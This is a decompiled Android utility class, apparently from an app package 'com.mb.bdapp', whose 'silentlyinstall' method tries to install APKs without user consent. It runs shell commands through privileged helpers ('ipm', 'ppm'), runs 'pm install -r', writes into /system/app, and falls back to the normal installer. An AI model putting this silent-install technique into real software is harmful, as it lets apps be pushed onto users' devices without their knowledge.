package com.mb.bdapp.util;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.text.TextUtils;
import java.io.File;

public class InstallUtils {
    private static final String TAG = "-- silentlyinstall --";

    /* JADX WARNING: Removed duplicated region for block: B:19:0x00e7  */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x007f  */
    public static boolean silentlyinstall(android.content.Context r16, java.lang.String r17, java.lang.String r18) {
        /*
        r1 = 0;
        r9 = 0;
        r7 = 0;
        r13 = r16.getPackageManager();	 Catch:{ Exception -> 0x0074 }
        r14 = 1;
        r0 = r17;
        r5 = r13.getPackageArchiveInfo(r0, r14);	 Catch:{ Exception -> 0x0074 }
        r1 = r5.packageName;	 Catch:{ Exception -> 0x0074 }
        r6 = 0;
        r13 = "-- silentlyinstall --";
        r14 = "-ipm-";
        android.util.Log.e(r13, r14);	 Catch:{ Throwable -> 0x0077 }
        r13 = java.lang.Runtime.getRuntime();	 Catch:{ Throwable -> 0x0077 }
        r14 = "ipm";
        r9 = r13.exec(r14);	 Catch:{ Throwable -> 0x0077 }
        r8 = new java.io.DataOutputStream;	 Catch:{ Throwable -> 0x0077 }
        r13 = r9.getOutputStream();	 Catch:{ Throwable -> 0x0077 }
        r8.<init>(r13);	 Catch:{ Throwable -> 0x0077 }
        r13 = new java.lang.StringBuilder;	 Catch:{ Throwable -> 0x0159 }
        r14 = "chmod 666 ";
        r13.<init>(r14);	 Catch:{ Throwable -> 0x0159 }
        r0 = r17;
        r13 = r13.append(r0);	 Catch:{ Throwable -> 0x0159 }
        r14 = "\n";
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0159 }
        r13 = r13.toString();	 Catch:{ Throwable -> 0x0159 }
        r8.writeBytes(r13);	 Catch:{ Throwable -> 0x0159 }
        r13 = new java.lang.StringBuilder;	 Catch:{ Throwable -> 0x0159 }
        r14 = "pm install -r ";
        r13.<init>(r14);	 Catch:{ Throwable -> 0x0159 }
        r0 = r17;
        r13 = r13.append(r0);	 Catch:{ Throwable -> 0x0159 }
        r14 = "\n";
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0159 }
        r13 = r13.toString();	 Catch:{ Throwable -> 0x0159 }
        r8.writeBytes(r13);	 Catch:{ Throwable -> 0x0159 }
        r13 = "exit\n";
        r8.writeBytes(r13);	 Catch:{ Throwable -> 0x0159 }
        r8.flush();	 Catch:{ Throwable -> 0x0159 }
        r9.waitFor();	 Catch:{ Throwable -> 0x0159 }
        r13 = "-- silentlyinstall --";
        r14 = "-ipm- end";
        android.util.Log.e(r13, r14);	 Catch:{ Throwable -> 0x0159 }
        r13 = 1;
        r7 = r8;
    L_0x0073:
        return r13;
    L_0x0074:
        r4 = move-exception;
        r13 = 0;
        goto L_0x0073;
    L_0x0077:
        r4 = move-exception;
    L_0x0078:
        r4.printStackTrace();
        r14 = new java.lang.StringBuilder;
        if (r6 == 0) goto L_0x00e7;
    L_0x007f:
        r13 = "/system/app/";
    L_0x0081:
        r13 = java.lang.String.valueOf(r13);
        r14.<init>(r13);
        r13 = r14.append(r1);
        r14 = ".apk";
        r13 = r13.append(r14);
        r12 = r13.toString();
        r13 = new java.lang.StringBuilder;
        r14 = "ppm =abcdefg= ";
        r13.<init>(r14);
        r14 = r16.getFilesDir();
        r13 = r13.append(r14);
        r14 = " -i ";
        r13 = r13.append(r14);
        r0 = r17;
        r13 = r13.append(r0);
        r14 = " ";
        r13 = r13.append(r14);
        r13 = r13.append(r12);
        r2 = r13.toString();
        r13 = "-- silentlyinstall --";
        r14 = new java.lang.StringBuilder;
        r15 = "cmd";
        r14.<init>(r15);
        r14 = r14.append(r2);
        r14 = r14.toString();
        android.util.Log.e(r13, r14);
        r13 = java.lang.Runtime.getRuntime();	 Catch:{ Throwable -> 0x00ea }
        r13 = r13.exec(r2);	 Catch:{ Throwable -> 0x00ea }
        r13.waitFor();	 Catch:{ Throwable -> 0x00ea }
        r13 = "-- silentlyinstall --";
        r14 = "-ppm-";
        android.util.Log.i(r13, r14);	 Catch:{ Throwable -> 0x00ea }
        r13 = 1;
        goto L_0x0073;
    L_0x00e7:
        r13 = "/data/app/";
        goto L_0x0081;
    L_0x00ea:
        r4 = move-exception;
        r4.printStackTrace();
        r13 = "-- silentlyinstall --";
        r14 = "-otherWay-";
        android.util.Log.e(r13, r14);	 Catch:{ Throwable -> 0x0152 }
        r13 = android.os.Environment.getExternalStorageDirectory();	 Catch:{ Throwable -> 0x0152 }
        r11 = r13.getAbsolutePath();	 Catch:{ Throwable -> 0x0152 }
        r13 = new java.lang.StringBuilder;	 Catch:{ Throwable -> 0x0152 }
        r14 = "cp /data/data/";
        r13.<init>(r14);	 Catch:{ Throwable -> 0x0152 }
        r14 = com.mb.bdapp.util.AppInfoUtils.getAppName(r16);	 Catch:{ Throwable -> 0x0152 }
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0152 }
        r14 = "/cache/";
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0152 }
        r0 = r18;
        r13 = r13.append(r0);	 Catch:{ Throwable -> 0x0152 }
        r14 = " ";
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0152 }
        r13 = r13.append(r11);	 Catch:{ Throwable -> 0x0152 }
        r3 = r13.toString();	 Catch:{ Throwable -> 0x0152 }
        r13 = java.lang.Runtime.getRuntime();	 Catch:{ Throwable -> 0x0152 }
        r13 = r13.exec(r3);	 Catch:{ Throwable -> 0x0152 }
        r13.waitFor();	 Catch:{ Throwable -> 0x0152 }
        r13 = new java.lang.StringBuilder;	 Catch:{ Throwable -> 0x0152 }
        r14 = java.lang.String.valueOf(r11);	 Catch:{ Throwable -> 0x0152 }
        r13.<init>(r14);	 Catch:{ Throwable -> 0x0152 }
        r14 = "/";
        r13 = r13.append(r14);	 Catch:{ Throwable -> 0x0152 }
        r0 = r18;
        r13 = r13.append(r0);	 Catch:{ Throwable -> 0x0152 }
        r10 = r13.toString();	 Catch:{ Throwable -> 0x0152 }
        r0 = r16;
        installApp(r0, r10);	 Catch:{ Throwable -> 0x0152 }
        r13 = 1;
        goto L_0x0073;
    L_0x0152:
        r4 = move-exception;
        r4.printStackTrace();
        r13 = 0;
        goto L_0x0073;
    L_0x0159:
        r4 = move-exception;
        r7 = r8;
        goto L_0x0078;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.mb.bdapp.util.InstallUtils.silentlyinstall(android.content.Context, java.lang.String, java.lang.String):boolean");
    }

    public static void installApp(Context c, String filePath) {
        c.startActivity(createInstallIntent(filePath));
    }

    public static Intent createInstallIntent(String filePath) {
        if (TextUtils.isEmpty(filePath)) {
            return null;
        }
        Uri uri = Uri.fromFile(new File(filePath));
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setFlags(268435456);
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        return intent;
    }
}
